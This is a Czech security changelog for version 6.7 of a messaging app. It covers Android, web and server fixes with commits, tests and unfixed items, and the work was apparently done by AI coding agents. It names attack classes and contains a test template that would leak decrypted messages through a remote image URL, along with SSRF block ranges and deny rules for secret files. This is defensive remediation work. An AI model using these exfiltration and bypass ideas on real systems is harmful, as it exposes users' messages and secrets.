| **S14** `$form` a PIN | první zadání nového PINu v soukromém poli (ne `$form.pin1`); obrazovky `lock` a `enroll` dostávají `$form = {}`; `url.open` ukazuje cíl (viz F-01) | `9bdb4cdc` | kód; `pin1` v kódu není |
| **S15** (F-07) „ověřeno" | P2P: podpis klíčem z hello (připnutým pod jménem peeru), pin beze změny a `senderName` = jméno peeru; relay: kid podpisu = TOFU pin pro (místnost, `senderName`) — dřív stačil libovolný platný podpis | `1d712f9a` | `VerifiedTest` (člen podepsaný vlastním klíčem jako „Alice" není ověřený) |
| **F-01** (kritická) design vynese zprávy | **aplikace** (`ui/DesignUrls`): počítaný `src` obrázku (`=…`, `{…}`) jen lokální zdroj (`asset:`, `data:image/`), vzdálený https jen jako pevný literál designu; `url.open` jen po potvrzení s ukázanou adresou. **server** (`design.ts` `checkImageSrc`/`checkActionArg`): v adrese obrázku žádné `{…}` (kromě `asset:`), ve výrazu žádná webová adresa, pevné vzdálené obrázky jen z hostitelů `ANDROID_DESIGN_IMAGE_HOSTS` (výchozí žádný); `url.open` jen pevná https adresa — ve stromech, menu i knihovnách | `d5d6b818` | `DesignUrlsTest` (šablona `https://…/{$msg.text}` proti dešifrované zprávě → nic se nestáhne); `test/android-design-urls.test.ts` (5) |
| **F-16** nepodepsaná politika | server posílá `policySigned = {at, policy, sig}` (ECDSA klíčem Androidu přes `m5policy/1|deviceId|at|JSON`) při enrolmentu i check-inu; aplikace (`security/SignedPolicy`, `Config.applyServerAnswer`) použije jen politiku podepsanou připnutým klíčem pro toto zařízení a ne starší než použitou (`policyAt`), jinak ji ignoruje a zůstane poslední podepsaná (nebo výchozí hodnoty aplikace); `autolockSeconds` ≤ 24 h | `68c2243f` | `SignedPolicyTest` (vektor podepsaný serverovým kódem; jiné zařízení / klíč / starší / změněná politika odmítnuty); `test/android-policy-signed.test.ts` |
| **N18** (rychlé části) | dialogy s tajemstvím `FLAG_SECURE` (změna PINu, heslo Wi-Fi, MRZ/CAN, safety number); změna PINu vyžaduje současný PIN, počítaný jako pokus o odemčení (`AppLock.confirmPin`); odmítnutý otisk se do wipe nepočítá (senzor zamyká systém); TLV max. 32 úrovní; BAC odmítne data / chráněný status bez DO'8E, MAC přes `MessageDigest.isEqual`; iterace zapečetěné zprávy ≤ 2 000 000; WebSocket 20 s timeout přes TLS a upgrade; názvy místností a jména peerů nejdou do logu (příkaz `status`) | `75ef3f7d` | `nfc/HardeningTest`, `chat/SealedBoundTest` |
| **N12** nonce před podpisem | nonce se zapíše až po ověření podpisu (nepodepsané požadavky mapu neplní) | `7794df35` | `test/android-policy-signed.test.ts` (N12) |

**Neopraveno (záměrně, s důvodem):**

- **F-16 — zbytek:** ověřovač PINu vázaný na hardware (pepř `m5.pep` s `setUnlockedDeviceRequired` / StrongBox s limitem pokusů — nový klíč znamená migraci obalu PINu, bez testu na zařízení příliš riskantní), čítač pokusů odolný proti vrácení starší kopie souboru (Keystore nemá monotónní čítač pro aplikace), zahození DEK při „zamknout", nouzový PIN. Útočník s rootem nebo spuštěním kódu jako aplikace tak dál může PIN hádat offline přes Keystore pepř.
- **F-01 — zbytek:** design dál smí `setting.set` / `setting.toggle` na citlivé klíče (sledování polohy, hlas přes server, emulace NFC) po klepnutí uživatele; `url.open` s adresou poskládanou z dat projde po jednom potvrzení. *(Oprava po vydání: `$form.nfcPin` v původním textu neplatí — PIN NFC karty je nativní pole `ui/parts/ToolPanels.java`, mimo `$form`; zmínka zůstala jen v nápovědě akcí `nfc.read` / `nfc.write` v `server/android/design-61.ts`.)*
- **S10 — derivace na UI vlákně** (jank / ANR na pomalých zařízeních): zůstává; přesun na pozadí mění tok zamykací obrazovky.
- **N18:** čekání podle systémových hodin (potřebuje `elapsedRealtime` + počítání restartů); `CallService` končí jen akcí `call.end` (oblast hovorů); nečitelný záznam trezoru → nová identita (potřebuje UX obnovy); tiché aktualizace APK a 80/400 MB v paměti (streamované stahování, ne rychlá oprava); ochrana proti downgradu bundlu (operátor vrací verzi zrušením publikace nejnovějšího buildu — nejdřív pravidlo na serveru); debug/release se stejným `applicationId` a důvěrou v uživatelské CA (vývojový postup); NFC karta se 4místným PINem (formát zapsaných karet).
- **N20:** Android job v CI — runner potřebuje platformu SDK 37, tady neověřitelné (RestrictedApi část je opravená v `b0b77407`).

**Pro ostatní oblasti 6.7:** `AppLock.isLocked()` je nově pravda i na pozadí po auto-locku; `Notify.message` sám skryje obsah, když je aplikace zamčená; obrázky designu s počítaným `src` musí být `data:`/`asset:` (fotky např. z účtu stahovat nativně a předávat jako `data:`); aplikace přijme politiku jen podepsanou — server a aplikace 6.7 je třeba nasadit spolu (se starším serverem platí výchozí hodnoty aplikace — zámek přísný: FLAG_SECURE, wipe po 8 pokusech, auto-lock 60 s; operátorovy změny politiky se neprojeví); nová proměnná `ANDROID_DESIGN_IMAGE_HOSTS`.

## Opraveno v 6.7 (web)

Webový klient a s ním související kontroly serveru. Každá oprava má regresní
test, který na kódu před opravou selhal (ověřeno spuštěním proti původním
souborům). Typy a `npx vitest run` zelené.

| Nález | Co se změnilo | Test |
|---|---|---|
| **V2** — výstupy funkcí od peerů | **Klient:** výstupy ve zprávě jiného člena (`MessageBubble` → `FnOutputs from={…}`) samy nic nedělají: kód v prohlížeči se ukáže jako karta „Spustit kód v prohlížeči od ‹odesílatel›?" a poběží až po kliknutí, **skrytý kód od jiného se nespustí nikdy**; flash, panely a autoplay čekají na uživatele (flash zůstane jen v bublině); spuštěný cizí kód smí modelu poslat `send`/`submit` jen během aktivace uživatelem (`navigator.userActivation`) a nejvýš 20× na spuštění, jeho flash nese jméno odesílatele; chyba vykreslení cizího výstupu se jen zaloguje (`fromError`), chybový vstupní bod modelu se jménem diváka nespustí; peer nesmí použít id `function:*` (`validate.ts isReservedSender`). **Server:** zpracovací relace si pamatuje, kdo ji otevřel (účet, u hosta id klienta) a — jen u modelu s viditelností „room" — slepé id místnosti, kde běžela (`server/functions/chain-access.ts`, sloupec `model_chains.opener`); `/api/functions/event` přijme událost jen od otevírajícího nebo od volajícího, který uvede totéž slepé id místnosti, jinak 410 jako u skončené relace. Kliknutí ostatních členů na tlačítka zprávy modelu v místnosti tak fungují dál; podvržená zpráva s relací otevřenou jinde (vlastní „caller" běh, jiná místnost) už oběť nic nespustí. Relace z doby před 6.7 (bez záznamu) se z aplikace nepokračují. | `test/fn-outputs.test.tsx` › „outputs in another member's message (6.7, V2)"; `test/functions-endpoints.test.ts` › „who may continue a session (6.7, V2)" |
| **S17** — nezapečetěné řádky historie | `createServerSealer().open()` nezapečetěný řádek odmítne (dřív ho vrátil, jak byl); obnovené zprávy znovu prochází `validateAttachment` (bezpečný MIME, jen `data:`, staré `blob:` zahozeny) a pravidly výstupů funkcí; `attachmentBlob()` dává blobu vždy `safeMime()` — příloha se v tomto originu nikdy neotevře jako HTML/SVG stránka (úhel `blob:`). | `test/chat-history.test.ts` › „rows the server made up (6.7, S17)" |
| **S18** — kolize `keyId` sender-key | Řetězce peerů klíčované `odesílatel + keyId`; řetězec předaný pod cizím id nepřepíše odesílatelův. | `test/sender-keys.test.ts` › „a chain handed over under another member's key id does not replace that member's" |
| **S19** — odesílatel souboru | `handleIncomingFrame(…, from)` dostává transportního peera (peer data kanálu; u proxy `from`, které doplní server); meta s jiným `senderId` nebo s rezervovaným id (`system`, `function:*`) se odmítne, rámce chunk/end/cancel od někoho jiného než odesílatele přenosu se ignorují (cizí `file-cancel` už přenos nezruší). | `test/file-transfer-hardening.test.ts` › „the file's sender is the peer that delivered it (S19)" |
| **S20** — paměť | Příjem: nejvýš 2 GiB bez ohledu na předvolbu (jako Android), nejvýš 128 Ki chunků (dřív 2 M × 2 pole), nejvýš 16 přenosů naráz a 4 od jednoho odesílatele, přenos bez rámce 2 min se zahodí. Přijaté bloby v paměti max. 200 souborů / 1 GiB (nejstarší se uvolní, jejich zpráva ukáže soubor jako zahozený), konverzace drží posledních 5000 zpráv / 256 MB (`lib/memory-caps.ts`). Výchozí předvolba velikosti přílohy zůstala „neomezeně" — tvrdý strop příjmu je 2 GiB. | `test/file-transfer-hardening.test.ts` › „receiving cannot exhaust memory (S20)" |
| **S21 / F-10** — název místnosti na server | Všechny cesty berou místnost z `lib/room-privacy.ts` (`serverRoomId()` = slepé id v3, nebo nic): čtení serverové historie hosta (čtení „pod čitelným názvem" z 3.0 zrušeno — ty řádky žijí jen den), zápis řádků, analytika při připojení (opt-in), běh / klik / hlášení funkcí. Funkce tak vidí `m5.caller.room` jako slepé id — jak SDK dokumentuje („the room id"), a `m5adm.rooms.get(m5.caller.room)` teď sedí na hash místnosti v hubu. Operátor název nepotřebuje: popisky místností v konzoli zadává sám (registr podle hashe). | `test/room-privacy.test.ts` |
| **F-04** — síla klíče místnosti | `lib/passphrase-strength.ts`: odhad entropie (běžná hesla a slova cs/en/de, roky, opakování, řady, název místnosti a jméno se počítají za pár bitů; slabý < 40 b, silný ≥ 64 b), v okně Místnost měřidlo, rady (cs/en/de) a tlačítko „Vygenerovat silný klíč" (generátor z Mých připojení, teď sdílený). Slabý klíč pro ručně zadanou místnost, která není uloženým připojením, se při prvním Připojit **zadrží** s vysvětlením; **druhé Připojit = „rozumím, místnost už existuje"** — klient nový a existující pokoj neodliší, aniž by se zeptal serveru, a právě dotaz serveru dá slepé id k hádání. Slepé id už je HKDF(Argon2id(…)) — offline pokus stojí totéž Argon2id jako obsahový klíč; test to drží. Nový slot `keyStrength` v layoutu „room" (archiv layoutů doplněn). | `test/passphrase-strength.test.tsx` |
| **N22** | Kontrola „cesta na tomto webu" (`lib/site-path.ts isSitePath`) v `sw.js`, `layout-tree.ts`, `menu-template.ts`, `menu-config.ts` a `App.tsx`: bez `//`, zpětného lomítka a řídicích znaků a cesta musí vést na tento origin (`/\host`, `/<tab>/host` byly cizí hosty). | `test/web-low-findings-67.test.ts` › N22 |
| **N26** | `fn-html` zahodí záporné okraje a jednotky okna (`vw`, `vh`, `dvh`…); `.fn-html__body` má `contain: paint`. | › N26 |
| **N27** | Úložiště DTLS otisků drží 100 naposledy viděných peerů. | › N27 |
| **N29** | Odkaz z NFC karty se otevře jen jako `https:`. | › N29 |
| **N30** | WebNFC `scanOnce` po timeoutu odpoví a po odpovědi sken zastaví. | › N30 |

Neopraveno (web, nízké) a proč:

- **N23** (TOFU piny, „poprvé viděný = verified") a **N28** (metadata v `localStorage`) — mění význam stavů identity v UI a formát lokálních úložišť; patří do samostatné práce na identitě s migrací.
- **N24** (sloty trezoru bez AAD a verze) — změna formátu dat uložených na serveru, potřebuje verzovanou migraci trezoru.
- **N25** (IV mediálních rámců) — změna protokolu hovoru na obou stranách (web i Android).
- **N31** (plaintext v systémových notifikacích) — volba „skrýt obsah" patří k paralelní práci na notifikacích (6.7 notify), aby se nekřížily úpravy `App.tsx`.
- **N32** (replay guard jen v paměti) — perzistence viděných id by v efemérním režimu ukládala stopu konverzace; potřebuje rozhodnutí o režimech.
- Z V2 zůstává **CSP sandboxu** s `connect-src https:` / `img-src https:` — kód modelu legitimně volá API; cizí kód teď běží až po vědomém kliknutí. Z S20 zůstává streamování velkých souborů do OPFS.
- **Android** (mimo web): `ui/parts/Fn.java:95` posílá do funkcí čitelný název místnosti (F-10). Dokud nebude posílat slepé id, server relaci otevřenou z Androidu v místnosti nespojí s webovými členy (a naopak) — kliknutí napříč platformami na tlačítka zprávy modelu vrátí „relace skončila“. *(Opraveno před vydáním v `4a1078a8`: aplikace posílá slepé id `r3.…`, `ui/parts/Fn.java:95-98`; aplikace starší než 6.7 posílá čitelný název dál.)*

## 8. Opraveno v 6.7 (server)

Opravy serverových nálezů na větvi agenta, každá s regresním testem, který
na původním kódu selže (u V1, V3, S3, S6, S16, F-14, F-27, N7 a N12 ověřeno
spuštěním proti původnímu souboru). Celkem po opravách: `npx tsc` ✅,
`npx vitest run` ✅ 185 souborů / 2113 testů (4 přeskočené), `npm run build` ✅,
`npm run test:e2e` spuštěné přímo z `.claude/worktrees/…` ✅ (viz S6).

| # | Opraveno v 6.7 | Commit | Test |
|---|---|---|---|
| V1 | Dítě sandboxu běží s `--permission` (čte jen svůj skript a interpret — složku Pyodide nebo `.wasm` QuickJS; žádný zápis, procesy, workery, addony, WASI, inspector) a `--disallow-code-generation-from-strings` (Pyodide i QuickJS s tím běží, ověřeno i na `dist/sandbox.cjs`); konstruktory `Function`/`AsyncFunction`/generátorů jsou odstavené z prototypů (`sealCodeConstructors`), most `_m5host` nemá prototyp. Sonda z auditu už soubor hostitele nepřečte. Bubblewrap/nsjail z dokumentace dál **není** (síť zavírají jen stuby v `harden.ts`), komentáře opraveny. | `14590ef0` | `test/functions-sandbox-wall.test.ts` |
| V3 | Slot brány se vrátí při zavření socketu, který se nestal WebSocketem (vadný klíč/verze/metoda, odchod uprostřed handshaku). | `f80878b8` | `test/signaling-upgrade-guard.test.ts` |
| V4 | `/api/settings`: JSON jako text, max 16 kB na zařízení, max 5000 zařízení (nejstarší zápis jde pryč), záznam po retenci zmizí i při čtení; totéž omezení počtu pro `consentLedger`. Vazba na doklad zařízení **ne** (žádný klient endpoint nepoužívá; zbývá). | `e0dd9dcf` | `test/unauth-state-bounds.test.ts` |
| S1 | Filtry `m5adm`: `SafeRegex` (`server/functions/safe-regex.ts`) — jednoduchý vzor (bez kvantifikované skupiny, zpětné reference a lookaroundu, nejvýš 1 kvantifikátor) nativně do 1000 znaků, jinak přes `node:vm` s timeoutem a časovým rozpočtem na volání; všechny subjekty filtru v jednom hlídaném kroku. | `1e165d7e` | `test/functions-safe-regex.test.ts` |
| S2 | `jwt.verify`: rodinu algoritmu určuje klíč — PEM nikdy HS*, RSA jen RS/PS, EC jen ES své křivky, sdílené tajemství jen HS; `opts.alg`/`opts.algorithms` dál zužují. | `f4d9d5c6` | `test/functions-jwt-alg.test.ts` |
| S3 | `server/upgrade-guard.ts`: koncové body si nárokují cesty (`/ws`, `/media/tel/…`, `/vite-hmr`), ostatní upgrade → 404 a `destroy()`. | `f80878b8` | `test/signaling-upgrade-guard.test.ts` |
| S4 | Limity `/api/admin` berou token funkce až po ověření HMAC (bucket podle podepsaného modelu); parsery 8 MB (Android design) a 1 MB (menu) až za limity a za `requireAdminToken` (`server/admin-limits.ts`); admin služba čte velká těla jen s bearerem. `requestTimeout`/`headersTimeout` nesníženy (upload APK 300 MB). | `818e4631` | `test/admin-limits.test.ts` |
| S5 | `AwayRelay.setAway` drží stejný strop 20 místností na účet jako úložiště (vypadlé místnosti → `peer-back`). Expirace away záznamů **ne** (změnila by presence; souběžně na ní pracuje presence agent). | `67b08077` | `test/away-relay-bound.test.ts` |
| S6 | `res.sendFile(jméno, { root })` v `static.ts` a `admin.ts`: tečka v cestě instalace nevadí, dotfile v URL dál odmítnut. E2E z `.claude/worktrees`: před opravou 53/72 selhalo, po ní 72/72 (jedno zastaralé očekávání E2E z commitu `5ab9bcc0` opraveno v `1c8820ee`). | `baaa1625` | `test/static-dotdir.test.ts` |
| S7 | Anonymní relace: nejvýš 20 živých na klienta, sdílený rozpočet bajtů `STORAGE_SESSION_BUDGET_MB` (výchozí 2048) — po jeho vyčerpání nová relace nevznikne a žádná databáze relace neroste. | `3ff5b864` | `test/storage-session-budget.test.ts` |
| S8 | Strop `ACCOUNTS_MAX` (výchozí 5000); plné úložiště uvolní místo jen odstraněním účtů nepoužitých od registrace (starší než týden, jediné přihlášení, prázdný trezor vč. registračního slotu, žádný další passkey, recovery, identita, push, away, mailbox ani živá relace), nejstarší napřed; plné úložiště = audit `accounts.full`. Registrant, který naplní trezor, se neodstraní — proti tomu zvýšit strop, pozvánky/PoW jsou další krok. | `f7e1d963` | `test/accounts-cap.test.ts` |
| S9 | Aktér auditu zpráv jen z ověřeného tokenu (jinak `guest`, id klienta jako `detail.claimedClient`); hodinový rozpočet záznamů (host/adresa 300, IPv6 po /64; účet 3000). Prořez žurnálu po kategoriích **ne** — mazání uprostřed by rozbilo hash řetěz. | `e0dd9dcf` | `test/unauth-state-bounds.test.ts` |
| S16 | Referenční nginx: `location /hooks/` (6 MB) a `location = /fn-sandbox.html` na aplikaci, CSP SPA s `frame-src 'self'`. | `4b0ab301` | `test/nginx-reference.test.ts` |
| N7 | Časovače (sweep fronty, plánovaná záloha + kontrola integrity, sweep telefonního mostu) chybu ohlásí, nespadnou; hlavní služba při `unhandledRejection` loguje a audituje místo ukončení. | `d5f6aedf` | `test/backup-timer.test.ts` |
| N10 | `/metrics` má limiter odmítnutých požadavků (30 / 15 min). Minimální délka tokenu ne (rozbilo by krátké `ADMIN_API_TOKEN`). | `d5f6aedf` | `test/unauth-state-bounds.test.ts` |
| N11 | Viz F-17 (Vonage SMS bez `sig` se secretem → 403, JWT s povinným čerstvým `iat` a `payload_hash`). | `d41469a3` | `test/telephony-webhooks-failclosed.test.ts` |
| N12 | Android: nonce se spotřebuje až po ověření podpisu a drží se po celé okno času požadavku (u `/events` 2 × 30 dní; mapa s pevným stropem). | `137a2089` | `test/android-server.test.ts` |
| N13 | Viz F-14 (všechny zápisy IPv6, vložená IPv4 v mapped/compatible/NAT64/6to4; literály IPv6 v URL se kontrolují jako adresy). | `2043c239` | `test/functions-ssrf-pin.test.ts` |
| N15 | `pattern` vstupů přes `SafeRegex` nad celou hodnotou s rozpočtem 100 ms. | `1e165d7e` | `test/functions-safe-regex.test.ts` |
| N16 | KV funkcí: hodnota max 1 MiB, klíč 512 znaků, scope max 10 000 klíčů a 64 MiB; chyba `kv-limit`. | `a1fb4bbc` | `test/functions-kv-limits.test.ts` |
| N19 | `npm audit fix`: `ip-address` 10.7.3, `qs` 6.16.0 (jen `package-lock.json`); `npm audit --omit=dev` = 0. Zbývá jen dev řetěz tailwind 3 → braces (5 high, oprava = tailwind 4, major). | `09f6c307` | — |

Z bezpečnostní analýzy (`docs/security-analysis.md`, commit `c043abef`), na pokyn integrátora:

| # | Opraveno v 6.7 | Commit | Test |
|---|---|---|---|
| F-14 | SSRF guard se připojuje na adresu, kterou zkontroloval: `node:http(s)` s `lookup` vracejícím jen ověřenou adresu (Host, SNI i kontrola certifikátu podle URL; gzip/deflate/br jako dřív) — `undici` nebyl nainstalovaný a `fetch` jméno resolvoval znovu. Při přesměrování na jiný origin se zahodí `Authorization`/`Cookie`; blokováno NAT64 local-use, Teredo, `fec0::/10`, `100::/64`. `/web` pro hosty a URL zpětného volání webhooku **ne** (mimo zadání). | `2043c239` | `test/functions-ssrf-pin.test.ts` |
| F-17 | Webhooky telefonie fail-closed, je-li materiál nastaven: Vonage SMS bez `sig` → 403 (výjimka jen `VONAGE_ALLOW_UNSIGNED_SMS=1`), podepsaná SMS se starým `timestamp` → 403, Vonage JWT musí mít `iat` ≤ 10 min a `payload_hash` u každého těla; Twilio/Telnyx chybějící podpis už odmítaly — test teď pokrývá každou cestu. Bez materiálu zůstává zdokumentované přijetí jako neověřené. `jti` cache ne (opakované doručení po 5xx by se odmítlo). `docs/telephony.md` doplněno. | `d41469a3` | `test/telephony-webhooks-failclosed.test.ts` |
| F-18 | Běh funkce s odpovězeným `m5.nfc` se označí `sensitive` a hodinový prořez ho i s logy smaže po `FUNCTIONS_NFC_RUN_HOURS` (výchozí 24 h místo 30 dní); záznam je do té doby úplný (dotazování webhookem funguje). Šifrování `functions.db` master klíčem zůstává plnou opravou — soubor čtou hlavní i admin proces, je to samostatná koordinovaná změna. Záznamy volání v `model_chains` (parametry/výsledek) se zkrácenou retencí **ne**. | `190ea08f` | `test/functions-nfc-retention.test.ts` |
| F-27 | `fs.deny` dev serveru a `.dockerignore` pokrývají `.env*` (příklad zůstává) a `*.bak`, dev server i `*~`. `.env-bak` uživatele zůstal nedotčen. Bind dev serveru na `127.0.0.1` **ne** (mimo zadání). | `79c48cf1` | `test/dev-secrets-deny.test.ts` |

**Neopraveno (serverové nízké nálezy):** N1, N3, N4, N6, N9, N21 (signalizace/hub a relay — souběžně je mění presence agent), N2 (persistence `accounts.json` = přechod na SQLite, ne rychlá oprava), N5 (limit file-proxy na IP potřebuje IP z hubu; `Set` sekvencí nese počet unikátních bloků pro opakované odeslání), N8 (start clusteru bez `CLUSTER_SECRET` odmítnout = změna chování nasazení), N14 (vazba odpovědi na volajícího potřebuje identitu relace v API), N17 (RSS mimo Linux bez nové závislosti), N20 (CI, Android job). Webové S17–S21 a V2 řeší webový agent.
